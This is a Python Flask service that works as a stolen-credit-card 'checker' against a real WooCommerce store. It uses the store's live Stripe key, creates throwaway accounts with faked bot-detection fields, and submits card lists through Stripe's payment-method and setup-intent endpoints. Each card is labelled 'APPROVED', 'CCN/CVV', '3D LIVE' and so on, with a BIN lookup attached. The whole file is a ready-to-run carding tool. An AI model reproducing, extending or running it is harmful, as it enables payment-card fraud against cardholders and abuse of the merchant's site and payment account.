import requests
import re
import json
import time
import random
import string
from urllib3.exceptions import InsecureRequestWarning
from urllib3 import disable_warnings
from datetime import datetime
from typing import Dict, Tuple, Optional, List
import threading

# Disable SSL warnings
disable_warnings(InsecureRequestWarning)

class StripeAuthAPI:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "https://iconichairproducts.com"
        self.stripe_key = "pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs"
        self.account_created = False
        self.cookies_initialized = False
        self.nonce_cache = {}
        self.lock = threading.Lock()
        self.setup_headers()
    
    def setup_headers(self):
        """Setup default headers for the session"""
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
        }
        self.session.headers.update(self.headers)
    
    def initialize_cookies(self):
        """Initialize cookies by visiting the my-account page"""
        try:
            response = self.session.get(
                f"{self.base_url}/my-account/", 
                timeout=30, 
                verify=False,
                allow_redirects=True
            )
            response.raise_for_status()
            self.cookies_initialized = True
            return True
        except Exception as e:
            print(f"Failed to initialize cookies: {e}")
            return False
    
    def extract_register_nonce(self, html_content):
        """Extract woocommerce-register-nonce from HTML"""
        pattern = r'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="([a-f0-9]+)"'
        match = re.search(pattern, html_content)
        return match.group(1) if match else None
    
    def extract_wp_referer(self, html_content):
        """Extract _wp_http_referer from HTML"""
        pattern = r'name="_wp_http_referer" value="([^"]+)"'
        match = re.search(pattern, html_content)
        return match.group(1) if match else "/my-account/"
    
    def is_logged_in(self, html_content):
        """Check if registration was successful by looking for MyAccount navigation"""
        patterns = [
            r'woocommerce-MyAccount-navigation-link--dashboard',
            r'woocommerce-MyAccount-navigation-link--orders',
            r'woocommerce-MyAccount-navigation-link--payment-methods'
        ]
        return any(re.search(pattern, html_content) for pattern in patterns)
    
    def get_random_email(self):
        """Generate a random email"""
        import random
        import string
        
        # Generate random username
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        
        # Random domain
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
        domain = random.choice(domains)
        
        return f"{username}@{domain}"
    
    def register_account(self):
        """Register a new account"""
        try:
            # Initialize cookies if not done already
            if not self.cookies_initialized:
                if not self.initialize_cookies():
                    return False
            
            # Generate random credentials
            email = self.get_random_email()
            password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            
            # Step 1: Get the registration page to extract nonce
            response = self.session.get(
                f"{self.base_url}/my-account/", 
                timeout=30, 
                verify=False
            )
            response.raise_for_status()
            
            # Extract nonce and referer
            nonce = self.extract_register_nonce(response.text)
            wp_referer = self.extract_wp_referer(response.text)
            
            if not nonce:
                print("Failed to extract nonce")
                return False
            
            # Step 2: Register the account
            registration_data = {
                'email': email,
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': 'https://iconichairproducts.com/my-account/payment-methods/',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': 'https://iconichairproducts.com/my-account/add-payment-method/',
                'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'wc_order_attribution_session_pages': '5',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                'woocommerce-register-nonce': nonce,
                '_wp_http_referer': wp_referer,
                'register': 'Register',
            }
            
            # Add additional form fields
            timestamp = int(time.time() * 1000)
            registration_data.update({
                'ak_bib': str(timestamp),
                'ak_bfs': str(timestamp + 6202),
                'ak_bkpc': '1',
                'ak_bkp': '3;',
                'ak_bmc': '3;3,7226;',
                'ak_bmcc': '2',
                'ak_bmk': '',
                'ak_bck': '',
                'ak_bmmc': '1',
                'ak_btmc': '2',
                'ak_bsc': '3',
                'ak_bte': '283;67,282;203,1497;22,5504;',
                'ak_btec': '4',
                'ak_bmm': '15,335;',
            })
            
            response = self.session.post(
                f"{self.base_url}/my-account/",
                data=registration_data,
                timeout=30,
                verify=False,
                allow_redirects=True
            )
            response.raise_for_status()
            
            # Check if registration was successful
            if self.is_logged_in(response.text):
                self.account_created = True
                print(f"Account created successfully! Email: {email}")
                return True
            else:
                print("Registration failed - not logged in")
                return False
                
        except Exception as e:
            print(f"Registration error: {e}")
            return False
    
    def extract_nonce_multiple_methods(self, html_content):
        """Extract nonce using multiple methods"""
        methods = [
            self._extract_via_direct_pattern,
            self._extract_via_stripe_params,
            self._extract_via_json_script,
            self._extract_via_fallback_pattern
        ]
        
        for method in methods:
            nonce = method(html_content)
            if nonce:
                return nonce
        return None
    
    def _extract_via_direct_pattern(self, html):
        pattern = r'"createAndConfirmSetupIntentNonce":"([a-f0-9]{10})"'
        match = re.search(pattern, html)
        return match.group(1) if match else None
    
    def _extract_via_stripe_params(self, html):
        pattern = r'var\s+wc_stripe_params\s*=\s*({[^}]+})'
        match = re.search(pattern, html)
        if match:
            try:
                json_str = match.group(1)
                json_str = re.sub(r',\s*}', '}', json_str)
                data = json.loads(json_str)
                return data.get('createAndConfirmSetupIntentNonce')
            except:
                pass
        return None
    
    def _extract_via_json_script(self, html):
        script_pattern = r'<script[^>]*>(.*?)</script>'
        scripts = re.findall(script_pattern, html, re.DOTALL)
        
        for script in scripts:
            if 'createAndConfirmSetupIntentNonce' in script:
                json_pattern = r'\{[^}]*(?:createAndConfirmSetupIntentNonce[^}]*)+[^}]*\}'
                json_matches = re.findall(json_pattern, script)
                for json_str in json_matches:
                    try:
                        clean_json = json_str.replace("'", '"')
                        data = json.loads(clean_json)
                        if 'createAndConfirmSetupIntentNonce' in data:
                            return data['createAndConfirmSetupIntentNonce']
                    except:
                        continue
        return None
    
    def _extract_via_fallback_pattern(self, html):
        patterns = [
            r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']',
            r'createAndConfirmSetupIntentNonce\s*=\s*["\']([a-f0-9]{10})["\']',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                return match.group(1)
        return None
    
    def get_ajax_nonce(self):
        """Get AJAX nonce from add-payment-method page"""
        try:
            response = self.session.get(
                f"{self.base_url}/my-account/add-payment-method/",
                timeout=30,
                verify=False
            )
            response.raise_for_status()
            
            nonce = self.extract_nonce_multiple_methods(response.text)
            return nonce
                
        except Exception as e:
            print(f"Failed to extract AJAX nonce: {e}")
            return None
    
    def parse_card(self, card_string: str) -> Dict:
        """Parse card string in various formats"""
        # Remove any whitespace
        card_string = card_string.strip()
        
        # Handle different separators
        if '|' in card_string:
            parts = card_string.split('|')
        elif '/' in card_string:
            parts = card_string.split('/')
        else:
            raise ValueError("Invalid card format")
        
        # Clean each part
        parts = [p.strip() for p in parts]
        
        # Extract card number (remove spaces)
        ccn = parts[0].replace(' ', '')
        
        # Extract month
        mm = parts[1]
        if len(mm) == 1:
            mm = f"0{mm}"
        
        # Extract year and CVV
        if len(parts) == 3:
            # Format: ccn|mm/yy|cvv or ccn|mm/yyyy|cvv
            year_part = parts[2]
            cvv = parts[3] if len(parts) > 3 else ''
        else:
            # Format: ccn|mm|yy|cvv
            year_part = parts[2]
            cvv = parts[3] if len(parts) > 3 else ''
        
        # Handle year format
        if len(year_part) == 2:
            yy = year_part
            yyyy = f"20{year_part}"
        elif len(year_part) == 4:
            yy = year_part[2:]
            yyyy = year_part
        else:
            raise ValueError("Invalid year format")
        
        return {
            'ccn': ccn,
            'mm': mm,
            'yy': yy,
            'yyyy': yyyy,
            'cvv': cvv
        }
    
    def format_scheme(self, scheme):
        """Format card scheme name"""
        scheme = scheme.lower().strip()
        
        mapping = {
            'visa': 'VISA',
            'mastercard': 'MasterCard',
            'mc': 'MasterCard',
            'master card': 'MasterCard',
            'amex': 'American Express',
            'american express': 'American Express',
            'americanexpress': 'American Express',
            'discover': 'Discover',
            'jcb': 'JCB',
            'diners': 'Diners Club',
            'diners club': 'Diners Club',
            'unionpay': 'UnionPay',
            'union pay': 'UnionPay',
            'maestro': 'Maestro',
            'elo': 'Elo',
            'hiper': 'Hiper',
            'hipercard': 'Hipercard'
        }
        
        return mapping.get(scheme, scheme.capitalize())
    
    def get_bin_info(self, bin):
        """Get BIN information from multiple sources"""
        bin = str(bin)[:6]
        
        # Try antipublic first
        result = self.get_bin_info_from_antipublic(bin)
        if result['country'] != 'Unknown' and result['bank'] != 'Unknown':
            return result
        
        # Try bincheck
        result = self.get_bin_info_from_bincheck(bin)
        if result['country'] != 'Unknown' and result['bank'] != 'Unknown':
            return result
        
        # Try binlist as fallback
        result = self.get_bin_info_from_binlist(bin)
        return result
    
    def get_bin_info_from_binlist(self, bin):
        """Get BIN info from binlist.net"""
        headers = {
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
        }
        
        try:
            response = requests.get(f"https://lookup.binlist.net/{bin}", headers=headers, timeout=5, verify=False)
            if response.status_code != 200:
                return {'country': 'Unknown', 'bank': 'Unknown'}
            
            data = response.json()
            scheme = data.get('scheme', 'Unknown')
            bank = data.get('bank', {}).get('name', 'Unknown')
            country = data.get('country', {}).get('name', 'Unknown')
            
            return {
                'scheme': self.format_scheme(scheme),
                'bank': bank,
                'country': country
            }
            
        except:
            return {'scheme': 'Unknown', 'country': 'Unknown', 'bank': 'Unknown'}
    
    def get_bin_info_from_bincheck(self, bin):
        """Get BIN info from bincheck.io"""
        headers = {
            'Referer': f'https://bincheck.io/details/{bin}',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v"138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }
        
        try:
            response = requests.get(f"https://bincheck.io/details/{bin}", headers=headers, timeout=5, verify=False)
            if response.status_code != 200:
                return {'scheme': 'Unknown', 'country': 'Unknown', 'bank': 'Unknown'}
            
            html = response.text
            
            # Extract scheme
            scheme_match = re.search(r'<td[^>]*>Card Brand</td>\s*<td[^>]*>([^<]+)</td>', html, re.IGNORECASE)
            scheme = scheme_match.group(1) if scheme_match else 'Unknown'
            
            # Extract bank
            bank_match = re.search(r'<td[^>]*>Bank</td>\s*<td[^>]*>([^<]+)</td>', html, re.IGNORECASE)
            bank = bank_match.group(1) if bank_match else 'Unknown'
            
            # Extract country
            country_match = re.search(r'<td[^>]*>Country</td>\s*<td[^>]*>([^<]+)</td>', html, re.IGNORECASE)
            country = country_match.group(1) if country_match else 'Unknown'
            
            return {
                'scheme': self.format_scheme(scheme),
                'bank': bank.strip(),
                'country': country.strip()
            }
            
        except:
            return {'scheme': 'Unknown', 'country': 'Unknown', 'bank': 'Unknown'}
    
    def get_bin_info_from_antipublic(self, bin):
        """Get BIN info from antipublic.cc"""
        headers = {
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
        }
        
        try:
            response = requests.get(f"https://bins.antipublic.cc/bins/{bin}", headers=headers, timeout=5, verify=False)
            if response.status_code != 200:
                return {'scheme': 'Unknown', 'country': 'Unknown', 'bank': 'Unknown'}
            
            data = response.json()
            
            scheme = data.get('brand', 'Unknown')
            bank = data.get('bank', 'Unknown')
            country = data.get('country_name', 'Unknown')
            
            return {
                'scheme': self.format_scheme(scheme),
                'bank': bank,
                'country': country
            }
            
        except:
            return {'scheme': 'Unknown', 'country': 'Unknown', 'bank': 'Unknown'}
    
    def categorize_response(self, response_text):
        """Categorize Stripe response"""
        response = response_text.lower()
        
        approved_keywords = [
            "succeeded", "payment-success", "successfully", "thank you for your support",
            "your card does not support this type of purchase", "thank you",
            "membership confirmation", "/wishlist-member/?reg=", "thank you for your payment",
            "thank you for membership", "payment received", "your order has been received",
            "purchase successful", "approved"
        ]
        
        insufficient_keywords = [
            "insufficient funds", "insufficient_funds", "payment-successfully"
        ]
        
        auth_keywords = [
            "mutation_ok_result", "requires_action"
        ]

        ccn_cvv_keywords = [
            "incorrect_cvc", "invalid cvc", "invalid_cvc", "incorrect cvc", "incorrect cvv",
            "incorrect_cvv", "invalid_cvv", "invalid cvv", ' "cvv_check": "pass" ',
            "cvv_check: pass", "security code is invalid", "security code is incorrect",
            "zip code is incorrect", "zip code is invalid", "card is declined by your bank",
            "lost_card", "stolen_card", "transaction_not_allowed", "pickup_card"
        ]

        live_keywords = [
            "authentication required", "three_d_secure", "3d secure", "stripe_3ds2_fingerprint"
        ]
        
        declined_keywords = [
            "declined", "invalid", "failed", "error", "incorrect"
        ]

        if any(kw in response for kw in approved_keywords):
            return "APPROVED", "🔥"
        elif any(kw in response for kw in ccn_cvv_keywords):
            return "CCN/CVV", "✅"
        elif any(kw in response for kw in live_keywords):
            return "3D LIVE", "✅"
        elif any(kw in response for kw in insufficient_keywords):
            return "INSUFFICIENT FUNDS", "💰"
        elif any(kw in response for kw in auth_keywords):
            return "STRIPE AUTH", "✅️"
        elif any(kw in response for kw in declined_keywords):
            return "DECLINED", "❌"
        else:
            return "UNKNOWN", "❓"
    
    def check_card(self, card_data: Dict, ajax_nonce: str) -> Tuple[str, str]:
        """Check card using Stripe API"""
        try:
            # First request - Stripe API to create payment method
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }

            # Prepare Stripe data
            data = f'type=card&card[number]={card_data["ccn"]}&card[cvc]={card_data["cvv"]}&card[exp_year]={card_data["yy"]}&card[exp_month]={card_data["mm"]}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2Fdda83de495%3B+stripe-js-v3%2Fdda83de495%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ficonichairproducts.com&time_on_page=22151&guid=59935264-a0ad-467b-8c25-e05e6e3941cb5cb1d3&muid=efadee54-caa2-4cbe-abfb-304d69bc865c187523&sid=b8c63ed0-7922-46ba-83f7-2260590ce31aa73df1&key={self.stripe_key}&_stripe_account=acct_1JmxDb2Hh2LP7rQY'

            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
            
            if response.status_code != 200:
                return "STRIPE API ERROR", "❌"
            
            stripe_response = response.json()
            
            if 'id' not in stripe_response:
                error_msg = stripe_response.get('error', {}).get('message', 'Unknown error')
                return f"STRIPE: {error_msg}", "❌"
            
            pid = stripe_response["id"]
            
            # Second request - Create setup intent
            headers = {
                'authority': 'iconichairproducts.com',
                'accept': '*/*',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'origin': 'https://iconichairproducts.com',
                'referer': 'https://iconichairproducts.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }

            form_data = {
                'action': 'create_setup_intent',
                'wcpay-payment-method': pid,
                '_ajax_nonce': ajax_nonce
            }

            response = self.session.post(
                'https://iconichairproducts.com/wp-admin/admin-ajax.php',
                headers=headers,
                data=form_data,
                timeout=30,
                verify=False
            )
            
            if response.status_code != 200:
                return "AJAX REQUEST FAILED", "❌"
            
            try:
                pix = response.json()
                
                if pix.get('success'):
                    return "APPROVED", "🔥"
                else:
                    error_msg = pix.get('data', {}).get('error', {}).get('message', 'Unknown error')
                    category, emoji = self.categorize_response(error_msg)
                    return f"{category}: {error_msg}", emoji
                    
            except json.JSONDecodeError:
                return "INVALID RESPONSE", "❌"
                
        except Exception as e:
            return f"ERROR: {str(e)}", "❌"
    
    def process_card(self, card_string: str) -> Dict:
        """Process a single card"""
        try:
            # Parse card
            card_data = self.parse_card(card_string)
            
            # Get BIN info
            bin_info = self.get_bin_info(card_data['ccn'][:6])
            
            # Register account if needed
            if not self.account_created:
                if not self.register_account():
                    return {
                        'card': card_string,
                        'full_response': f"{card_string} --> ACCOUNT REGISTRATION FAILED ❌",
                        'result': "ACCOUNT REGISTRATION FAILED ❌"
                    }
            
            # Get AJAX nonce
            ajax_nonce = self.get_ajax_nonce()
            if not ajax_nonce:
                return {
                    'card': card_string,
                    'full_response': f"{card_string} --> NONCE EXTRACTION FAILED ❌",
                    'result': "NONCE EXTRACTION FAILED ❌"
                }
            
            # Check card
            result, emoji = self.check_card(card_data, ajax_nonce)
            
            # Build response
            bin_str = f"{bin_info['scheme']} - {bin_info['bank']} - {bin_info['country']}"
            full_response = f"{card_string} --> {result} {emoji} | {bin_str}"
            
            return {
                'card': card_string,
                'full_response': full_response,
                'result': f"{result} {emoji} | {bin_str}"
            }
            
        except Exception as e:
            return {
                'card': card_string,
                'full_response': f"{card_string} --> ERROR: {str(e)} ❌",
                'result': f"ERROR: {str(e)} ❌"
            }


# Flask API Server
from flask import Flask, request, jsonify

app = Flask(__name__)

# Global instance (in production, use proper session management)
api = StripeAuthAPI()

@app.route('/chk', methods=['GET'])
def check_cards():
    """API endpoint to check cards"""
    lista = request.args.get('lista', '')
    
    if not lista:
        return jsonify({'error': 'No cards provided'}), 400
    
    # Split cards by newline
    cards = lista.strip().split('\n')
    
    results = []
    for card_str in cards:
        if card_str.strip():
            result = api.process_card(card_str.strip())
            results.append(result)
    
    return jsonify({'results': results})

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({'status': 'online', 'account_created': api.account_created})

if __name__ == '__main__':
    # Initialize the API
    print("Initializing Stripe Auth API...")
    print(f"Base URL: {api.base_url}")
    
    # Try to create account first
    print("Creating account...")
    if api.register_account():
        print("Account created successfully!")
    else:
        print("Account creation failed, will retry per request")
    
    # Start Flask server
    print("Starting API server on http://0.0.0.0:5000")
    app.run(host='0.0.0.0', port=5000, debug=False)